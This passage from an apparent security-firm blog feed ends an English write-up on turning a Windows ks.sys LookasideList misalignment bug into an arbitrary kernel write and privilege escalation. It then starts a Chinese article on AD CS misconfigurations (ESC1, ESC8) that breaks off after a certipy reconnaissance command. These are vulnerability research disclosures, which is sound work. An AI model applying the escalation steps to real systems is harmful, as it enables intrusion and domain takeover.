  &lt;p&gt;Non–0x10-byte–aligned Frame Buffer + LookasideList&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So, what happens if a frame buffer that’s not 0x10-byte aligned is inserted into a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;?&lt;/p&gt;

&lt;h4 id=&quot;lets-play-the-funky-frame&quot;&gt;Let’s play the funky frame.&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We write a script to list out all possible alignment mask and padding size. In this case, we’re using an alignment mask that results in 8 bytes of padding. Then, we configured the allocator to pre-allocate 4 frame buffer. As a result, each buffer will follow the same layout — and due to the 8-byte padding, the resulting frame buffer addresses all end with 0x08.&lt;/p&gt;

&lt;p&gt;The buffers will look like this one : 
&lt;img src=&quot;/assets/img/blog/20250517/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, the allocator returns four buffers — A, B, C, and D — all of which have addresses ending in 0x8 due to the applied padding.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When these buffers are freed, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; releases them one by one and inserts each of them into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; in order.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As illustrated in the diagram above, we first free &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame A&lt;/code&gt;, which gets inserted into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; without any issues.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame B&lt;/code&gt; is freed, the allocator first aligns the address of the current list head (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame A&lt;/code&gt;) to satisfy the 0x10-byte alignment requirement. &lt;strong&gt;It then stores this aligned address in the next pointer field of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame B&lt;/code&gt;&lt;/strong&gt;, and inserts Frame B at the head of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We continue by freeing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame C&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame D&lt;/code&gt;, both of which follow the same pattern as before. In the end, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; will look like the layout illustrated in the diagram above.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Have you spotted the issue?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The issue lies in the &lt;strong&gt;next pointer of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame D&lt;/code&gt;&lt;/strong&gt;. Due to alignment, &lt;strong&gt;the next pointer ends up pointing to the start of the pool chunk, rather than the actual frame buffer&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the diagram above, you’ll notice that the next pointer of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame C&lt;/code&gt; points to the padding area, which contains the stored padding size, not the expected list entry structure. When interpreted as a 64-bit value, this pointer becomes something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000000&lt;/code&gt; —
which falls within the user-space address range.&lt;/p&gt;

&lt;p&gt;Our plan is to allocate a memory page at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000000&lt;/code&gt;, allowing us to gain control over the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;. We then configure the final node in the list to point to our desired target address. After that, when the device performs a read operation,
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will write the incoming data into these frame buffers — including the one pointing to our chosen address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;In theory, this gives us an arbitrary memory write primitive, right?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;However, we still face the same limitation as before: we cannot control the content that gets written.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Additionally, we cannot use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffered flag&lt;/code&gt; in this scenario, which means we’re limited to whatever data the device sends — making precise exploitation much more difficult.&lt;/p&gt;

&lt;p&gt;At this point, we were stuck again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But after thinking it through once more, we found another way forward.&lt;/p&gt;

&lt;h4 id=&quot;lets-make-the-lookasidelist-great-again&quot;&gt;Let’s make the LookasideList great again&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the diagram above, we first construct a fake linked list in user space. The address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x41410000&lt;/code&gt; represents a user-controlled memory region, which we use to construct a valid &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; entry. Then, we proceed to allocate the frame buffer, which causes the allocator to traverse the fake list we’ve constructed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExAllocateFromNPagedLookasideList&lt;/code&gt;, the allocator first aligns the chunk and then updates the list head. However, due to the misalignment, the alignment logic mistakenly &lt;strong&gt;interprets the start of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame&lt;/code&gt; D as a next pointer&lt;/strong&gt; — leading to incorrect traversal of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the first chunk is popped from the list, the linked list transforms into the state shown in the diagram above. Next, we allocate all remaining chunks from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;. We also configure the allocator to use smaller frame buffers, which causes the webcam to &lt;strong&gt;enter a wait state — it no longer reads data from the device&lt;/strong&gt;. Next, we trigger a STOP to release all of the frame buffers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The frame buffer will appear as shown in the diagram above. At this point, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; begins returning the buffers to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;, one by one. First, it releases &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame D&lt;/code&gt;. Then, it frees the malicious chunk at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000000&lt;/code&gt;. After that, it frees the fake chunk at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x41410000&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the three chunks have been released, the structure of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; transforms into the layout illustrated above. In the end, the allocator will release our target address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;It will cause the next pointer of target address to point to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x41410000&lt;/code&gt;&lt;/strong&gt;. This value can be any user-space address controlled by the attacker.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In other words, we now have a powerful arbitrary memory write primitive.&lt;/p&gt;

&lt;p&gt;After gaining arbitrary memory write on Windows 23H2, we can use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation&quot;&gt;NtQuerySystemInformation&lt;/a&gt; to leak the address of the &lt;a href=&quot;https://www.vergiliusproject.com/kernels/x64/windows-11/23h2/_ETHREAD&quot;&gt;thread object&lt;/a&gt;. With that address, we &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;flip the necessary bit&lt;/a&gt; in the token structure to escalate privileges. From here, we can apply any &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;well-known EoP&lt;/a&gt; technique to achieve full privilege escalation. By the way, once you’ve achieved arbitrary memory write, &lt;strong&gt;don’t forget to restore the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;&lt;/strong&gt; to a valid state — otherwise, the system may crash during subsequent allocations.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/QSPbzE1KUbA?si=Dgow1vCMCaKASNra&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;We’ve successfully turned what seemed like a harmless bug into a serious vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;the-next--summary&quot;&gt;The Next &amp;amp; Summary&lt;/h2&gt;

&lt;p&gt;This bug patterns may not be limited to Kernel Streaming alone. By paying closer attention to MDL-related issues, you might be able to discover many more bugs in other driver. Kernel Streaming remains a fascinating research target and likely still harbors many undiscovered vulnerabilities beneath its surface.&lt;/p&gt;

&lt;p&gt;Gaining a deep understanding of Windows API implementations — and recognizing the risks of their misuse — is essential to uncovering new vulnerabilities and building effective exploitation techniques.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Keep these patterns in mind — it might be your next vulnerability.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls&quot;&gt;Using MDLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Windows Kernel Security - A Deep Dive into Two Exploits Demonstrated at Pwn2Own&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;CVE-2023-29360 Analysis
&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Easy Local Windows Kernel Exploitation
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2025/05/17/frame-by-frame-kernel-streaming-keeps-giving-vulnerabilities-en/</link>
                <guid>https://devco.re/blog/2025/05/17/frame-by-frame-kernel-streaming-keeps-giving-vulnerabilities-en</guid>
                <pubDate>Sat, 17 May 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>關於分分鐘拿下整個網域，你還疏忽了什麼？</title>
                <description>&lt;p&gt;本篇基於強者我隊長 vtim 在 DEVCORE Conference 2024 的 talk「&lt;a href=&quot;https://conf.devco.re/2024/keynote/DEVCORE-CONFERENCE-2024-Vtim-Taking-down-AD-in-minutes-things-that-you-missed-about-AD.pdf&quot;&gt;分分鐘拿下整個網域 - 關於 AD，你還疏忽了什麼？&lt;/a&gt;」。&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;本文分享我們在實戰上遇到 AD CS 的經驗以及特別的案例，並介紹 AD CS 的基本概念，希望讓企業與對 Active Directory 安全有興趣的讀者了解其重要性和潛在的風險。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#什麼是-ad-cs&quot;&gt;什麼是 AD CS？&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#實戰統計&quot;&gt;實戰統計&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#一個漏洞的產生&quot;&gt;一個漏洞的產生&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#網域風險&quot;&gt;網域風險&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#案例分享&quot;&gt;案例分享&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#案例一esc8--esc3-like-escalation&quot;&gt;案例一：ESC8 + ESC3-like Escalation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#案例二沒有-135-port-的-esc11&quot;&gt;案例二：沒有 135 port 的 ESC11&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#案例三撿到私鑰&quot;&gt;案例三：撿到私鑰&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#時間軸&quot;&gt;時間軸&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#結語&quot;&gt;結語&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#references&quot;&gt;References&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;什麼是-ad-cs&quot;&gt;什麼是 AD CS？&lt;/h2&gt;

&lt;p&gt;在企業中，管理內網大量主機一直都是系統管理員的一大挑戰。Microsoft 提供了 Active Directory 這個解決方案 (以下簡稱為 AD)，以階層式且集中化的架構來管理電腦、使用者及資源，它的方便性也因此成為許多企業愛用的內網管理工具。從 2017 年紅隊演練統計至今，我們約有 89.6% 的客戶使用 AD 作爲管理的解決方案。&lt;/p&gt;

&lt;p&gt;AD CS，全名為 Active Directory Certificate Services，是 Microsoft 提供在 AD 中作為可選用的 PKI 角色，用於憑證管理和頒發、身分驗證、加密傳輸等。AD CS 的 CA (Certificate Authority) 分為兩種模式：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Standalone CA&lt;/li&gt;
  &lt;li&gt;Enterprise CA -&amp;gt; 本文要探討的配置&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Enterprise CA 模式會與 AD 整合，因此身分驗證及憑證權限等設定是和 AD 的身分綁定，也是企業通常採用的方式。&lt;/p&gt;

&lt;p&gt;談到 AD CS 的運作，憑證是透過憑證範本 (Certificate Templates) 來管理，它包含這張憑證的各種屬性如 Extended Key Usage (EKU)、加密方式、申請權限、有效時間等，企業可以根據需求建立不同的憑證範本。&lt;/p&gt;

&lt;p&gt;舉例來說，網域使用者申請 User 憑證要透過對 CA 發起 Certificate Signing Request (CSR)，並指定 User 憑證範本，這個過程中 CA 會驗證使用者的身分及權限，若允許則根據憑證範本的設定頒發憑證，使用者便能以這張憑證進行身分驗證存取網域內的資源：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然而 AD CS 的設定容易造成疏失，弱點會發生在 &lt;strong&gt;CA 及憑證範本的設定&lt;/strong&gt;上。若攻擊者成功利用這些漏洞，可能導致網域中的高權限使用者的憑證被攻擊者取得並驗證成為這些身分，而得以存取網域中的機密資訊。加上&lt;strong&gt;變更密碼並無法讓憑證失效&lt;/strong&gt;，必須直接撤銷該憑證，若不知道根因攻擊者還是可以以該身分存取網域！&lt;/p&gt;

&lt;p&gt;甚至攻擊者可取得根憑證的私鑰，偽造任意身分的憑證，除了可存取所有網域資源外也非常難以偵測，還需要撤銷根憑證才有辦法避免再被偽造。這代表網域中的憑證皆會失效，後果不堪設想。&lt;/p&gt;

&lt;p&gt;2021 年 SpectreOps 團隊整理了&lt;a href=&quot;https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf&quot;&gt;白皮書 Certified Pre-Owned&lt;/a&gt;，文中歸納了各種攻擊手法包括 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt; 表示編號)：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;THEFTx&lt;/code&gt; - 憑證竊取&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PERSISTx&lt;/code&gt; - 網域帳號權限維持&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DPERSISTx&lt;/code&gt; - 網域權限維持&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ESCx&lt;/code&gt; - 網域提權&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;白皮書中也包括了防禦及偵測的建議，非常建議讀者閱讀～&lt;/p&gt;

&lt;h2 id=&quot;實戰統計&quot;&gt;實戰統計&lt;/h2&gt;

&lt;p&gt;截至 2025 年 1 月，我們發現在上百場紅隊演練中：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;86.1% 企業有安裝 AD CS&lt;/li&gt;
  &lt;li&gt;這些企業中有 70.1% 存在不安全設定&lt;/li&gt;
  &lt;li&gt;不安全設定中 90.9% 可利用&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;總計來說，裝有 AD CS 的 AD 中高達 54.9% 左右的比例可以&lt;strong&gt;直接取得網域最高權限&lt;/strong&gt;，整個利用過程&lt;strong&gt;僅需數分鐘&lt;/strong&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在這之中可以細分利用的手法，其中以 ESC1 發生的頻率最高：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;你可能想問真的這麼容易發生嗎？接下來我們來看看一個常見的情境可能造成這樣的弱點。&lt;/p&gt;

&lt;h2 id=&quot;一個漏洞的產生&quot;&gt;一個漏洞的產生&lt;/h2&gt;

&lt;p&gt;想像你是一位 AD 管理員，今天內網網站的管理者説：「ㄟ！最近被通報網站會跳出連線不安全的警告，不處理會被電啦，幫我&lt;strong&gt;弄個憑證&lt;/strong&gt;處理⼀下好嗎？」&lt;/p&gt;

&lt;p&gt;「喔對了，⼀些比較重要的伺服器有&lt;strong&gt;雙向驗證&lt;/strong&gt;的需求，也⿇煩幫處理⼀下」&lt;/p&gt;

&lt;p&gt;於是你開啟 MMC.exe 進入憑證範本設定頁面：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;預設的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Web Server&lt;/code&gt; 憑證範本的版本是 1，可設定的選項很少。你複製出一張新的範本來操作，創建了一個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CORP Web Server&lt;/code&gt; 的憑證範本並設定好有效的時間：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/a.png&quot; style=&quot;display:block;margin-left: auto;margin-right:auto;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;為了要讓使用者可自行申請，所以加上申請權限：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/b.png&quot; style=&quot;display:block;margin-left: auto;margin-right:auto;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;內網管理者說他需要雙向驗證，而原本的憑證範本的 EKU 只有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Authentication&lt;/code&gt;，那就打開 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Client Authentication&lt;/code&gt; 沒錯吧：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/c.png&quot; style=&quot;display:block;margin-left: auto;margin-right:auto;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;參考一下網路上憑證的設定，可以看到像是微軟官方網站 microsoft.com 的憑證也有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Client Authentication&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Authentication&lt;/code&gt; 等 EKU，看起來設定非常完美：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最後在 CA 啟用該憑證範本：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這樣普通的流程卻造成了 ESC1，也就是我們案例中最常見的 AD CS 提權弱點。下列是以 &lt;a href=&quot;https://github.com/ly4k/Certipy&quot;&gt;certipy&lt;/a&gt; 工具檢查的結果，滿足下列條件：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;憑證範本啟用&lt;/li&gt;
  &lt;li&gt;允許申請者指定 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Subject Alternative Name&lt;/code&gt; (SAN) 欄位 -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EnrolleeSuppliesSubject&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;憑證範本的 EKU 允許網域認證，例如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Client Authentication&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Smart Card Logon&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Any Purpose&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PKINIT Client Authentication&lt;/code&gt; 或沒有 EKU&lt;/li&gt;
  &lt;li&gt;不需管理者授權申請&lt;/li&gt;
  &lt;li&gt;不需簽章&lt;/li&gt;
  &lt;li&gt;允許低權限使用者申請&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;簡單來說，由於 AD CS 會以 SAN 欄位來驗證使用者身分，因此若可以任意申請該憑證且指定 SAN，加上該憑證允許對網域認證時，申請者便能&lt;strong&gt;假扮為任意網域使用者&lt;/strong&gt;進行身分驗證來提權。&lt;/p&gt;

&lt;p&gt;這樣簡單的設定疏失也非常容易發生在 AD CS 的各種地方，例如 CA 安裝了 Web Enrollment 等 HTTP 服務時就預設存在弱點 (ESC8)，也造成如此高比例安裝 AD CS 的企業存在這些不安全的設定。&lt;/p&gt;

&lt;p&gt;實戰上，我們也有遇到憑證範本只允許特定的群組申請，然而該群組卻沒有足夠的保護，導致攻擊者取得這些權限的成本不高，例如透過 Kerberoasting 等手法取得可申請憑證的帳號，&lt;strong&gt;僅僅多了一個步驟，同樣可達成網域接管&lt;/strong&gt;；又或是開啟了管理員授權申請及拔掉了申請權限，但卻留下了寫入權限。在這個情境下，攻擊者仍可自行將權限寫入並移除管理者授權申請的設定，導致憑證範本仍可被利用來取得網域管理員權限。&lt;/p&gt;

&lt;h2 id=&quot;網域風險&quot;&gt;網域風險&lt;/h2&gt;

&lt;p&gt;多數企業會安裝一個網域樹系，再往下切分多個子網域進行管理，較少數會切出多個樹系，這樣的做法在資源存取上會有較多的限制，但同時提供了更好的保護得以將資源隔離，例如同個樹系下 CA 不需額外設定即可讓所有的網域使用該 PKI 架構，但也代表若該 CA 被入侵，將導致所有在該樹系的網域被攻擊者取得控制權。&lt;/p&gt;

&lt;p&gt;假設攻擊者取得任一個子網域的控制權限，對於整個樹系將會造成什麼樣的風險？通常我們會先利用 SID History Injection 等攻擊手法提權到根網域，但並不是每個網域環境皆可用，因為這個手法可能會被 SID Filtering 機制所阻擋。然而，若是企業中存在 AD CS，攻擊者可以修改 LDAP 的 Configuration Naming Context 中相關的 PKI 物件，進而影響整個樹系包含根網域，最終取得 Enterprise Admins 的憑證，詳細手法可參考 SpecterOps 團隊的技術文章 &lt;a href=&quot;https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c&quot;&gt;From DA to EA with ESC5&lt;/a&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;更驚人的是，在網域樹系&lt;strong&gt;沒有 AD CS&lt;/strong&gt; 的情境下，攻擊者可自行安裝 AD CS 提權到根網域！實際上兩個手法的原理其實是相同的，因為涵蓋整個樹系的設定除了子網域會從根網域向下同步外，也會向上同步，影響到根網域的設定達到提權的效果。&lt;/p&gt;

&lt;p&gt;至於多個樹系的情境下，一個網域樹系的 CA 被入侵也有可能導致其他樹系的淪陷，但前提必須有額外設定讓其他網域樹系信任該 CA：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果其他網域樹系信任被入侵的 CA 的話，攻擊者可以簽任意憑證存取這些樹系，突破樹系的 security boundary。&lt;/p&gt;

&lt;p&gt;對於 AD CS 的部署，理想情況應將 root CA 離線，並用 subordinate CA 來頒發憑證，也就是兩階層以上的架構如 &lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786436(v=ws.11)&quot;&gt;Securing PKI: Planning a CA Hierarchy&lt;/a&gt; 文中所述。假設不幸的 subordinate CA 被入侵，還可透過撤銷其憑證來避免需要整個 PKI 重建的窘境。在多個樹系的架構，這樣的做法也可以讓損害不至於擴大到其他樹系。&lt;/p&gt;

&lt;h2 id=&quot;案例分享&quot;&gt;案例分享&lt;/h2&gt;

&lt;p&gt;在我們遇到的案例中，絕大多數情境都是可以直接利用，導致整個網域樹系在數分鐘內被取得最高權限。我們想分享幾個特別的例子；這些例子是已經經過一定程度的強化，無法直接利用或是不存在「定義」上的弱點，卻仍可被攻擊者間接利用，成功取得網域最高權限的案例。&lt;/p&gt;

&lt;p&gt;註：以下案例皆已去識別化。&lt;/p&gt;

&lt;h3 id=&quot;案例一esc8--esc3-like-escalation&quot;&gt;案例一：ESC8 + ESC3 like Escalation&lt;/h3&gt;

&lt;p&gt;在我們進入企業內網並取得網域帳號後，起手式當然先是 AD CS 的偵察，馬上掏出 certipy 工具：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;certipy find &lt;span class=&quot;nt&quot;&gt;-stdout&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user@corp.local&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

